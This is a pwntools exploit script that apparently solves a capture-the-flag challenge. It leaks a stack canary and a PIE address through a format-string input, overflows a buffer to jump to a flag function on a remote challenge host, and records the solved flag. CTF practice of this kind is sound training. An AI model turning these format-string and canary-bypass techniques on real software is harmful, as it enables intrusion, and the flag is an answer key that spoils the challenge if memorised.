from pwn import *

r = remote('95.216.233.106', 39210)
#r = process('./fiap')

r.recvuntil('name?')

# canary @ offset 10
# pie @ offset 3 - (-0x128f)
r.sendline('%3$p %11$p')

r.recvuntil('you, ')
pie, canary = r.recvline().strip().replace('!','').split(' ')
pie = int(pie, 16)
canary = int(canary, 16)

base_addr = pie - 0x128f
flag_addr = base_addr + 0x1209

log.info('Canary leak: {}'.format(hex(canary)))
log.info('Pie leak: {}'.format(hex(pie)))

r.recvuntil('cake?')

payload = ""
payload += "A"*25 #padding for canary
payload += p32(canary)
payload += "A"*12 #padding for ret
payload += p32(flag_addr)

r.sendline(payload)
r.interactive()

# ractf{B4k1ng_4_p1E!}
